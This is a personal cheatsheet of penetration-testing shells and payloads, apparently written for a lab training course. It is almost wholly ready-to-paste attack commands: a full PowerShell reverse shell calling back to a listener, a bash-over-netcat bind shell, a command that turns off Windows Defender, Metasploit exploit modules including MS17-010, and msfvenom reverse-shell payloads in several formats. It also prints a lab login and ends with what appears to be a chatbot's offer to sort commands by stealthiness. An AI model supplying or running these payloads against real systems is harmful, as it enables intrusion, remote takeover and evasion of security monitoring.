
2025-10-11 10:21

Status:

Tags: [[cheatsheet]],[[shell]]


# Shells and Payloads Cheatsheet


A compact, copy-friendly reference for common post-exploitation, reverse shells, enumeration and payload-generation commands. Paste blocks directly into a shell or terminal.

---

## RDP / Remote Desktop

```bash
# Connect via FreeRDP (CLI)
xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!
```

---

## Environment / enumeration

```bash
# Print environment variables (works in many shells)
env

# List files with details & permissions
ls -la <path/to/fileorbinary>

# Show which commands you can run with sudo
sudo -l
```

---

## Netcat (listeners & connect)

```bash
# Start a listening netcat (privileged port needs sudo)
sudo nc -lvnp <port#>

# Connect to a netcat listener
nc -nv <listener-ip> <port>
```

---

## Classic bind shell (bash over nc)

```bash
# Bind a bash shell to 10.129.41.200:7777 (named pipe FIFO trick)
rm -f /tmp/f; mkfifo /tmp/f;
cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

---

## Windows PowerShell reverse shell (one-liner)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Disable Windows Defender real-time monitoring (PowerShell)

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

> **Warning:** disabling AV/Defender is dangerous and monitored in real environments. Use only in lab/test contexts.

---

## Metasploit (common module usage)

```text
# Use psexec-style SMB exploit module
use exploit/windows/smb/psexec

# Drop into system shell from meterpreter
shell

# Check for MS17-010 vulnerability
use auxiliary/scanner/smb/smb_ms17_010

# Exploit MS17-010 with psexec payload
use exploit/windows/smb/ms17_010_psexec

# Example: rConfig exploit module
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

---

## msfvenom — generate payloads

```bash
# Linux ELF reverse shell (stageless)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf

# Windows EXE reverse shell (stageless)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe

# macOS Mach-O reverse shell (stageless)
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho

# Windows Meterpreter as ASP web payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp

# Java JSP raw reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp

# Java WAR reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war
```

---

## Spawn interactive shells (Unix)

```bash
# Better interactive TTY via python
python -c 'import pty; pty.spawn("/bin/sh")'

# Simple spawn
/bin/sh -i

# Perl / Ruby / Lua / Awk spawn examples
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e "os.execute('/bin/sh')"
awk 'BEGIN {system("/bin/sh")}'
```

---

## `find` tricks to spawn shells or exec quickly

```bash
# find and exec /bin/sh
find . -exec /bin/sh \; -quit

# find with awk spawn (careful with quoting)
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

---

## Common webshell and script locations (Pentest boxes / tooling)

```
/usr/share/webshells/laudanum
/usr/share/nishang/Antak-WebShell
```

---

## Quick tips

- Use full absolute paths (e.g., `C:\Temp\file.exe` or `/tmp/file`) to avoid ambiguity.
    
- When upgrading a reverse shell to an interactive TTY, use `python -c 'import pty; pty.spawn("/bin/sh")'` then `Ctrl-Z` and `stty rows N cols M; fg` from your attacker terminal.
    
- Be cautious running powerful commands (e.g., disabling AV) — only in controlled lab environments.
    
- Replace IPs, ports and credentials with your lab/test values before running.
    

---

If you want, I can:

- convert this into a printable 1-page Markdown/PDF,
    
- reorder commands by stealthiness (quiet → noisy),
    
- or split it into Windows vs Linux cheat sheets. Which would you like?


# References
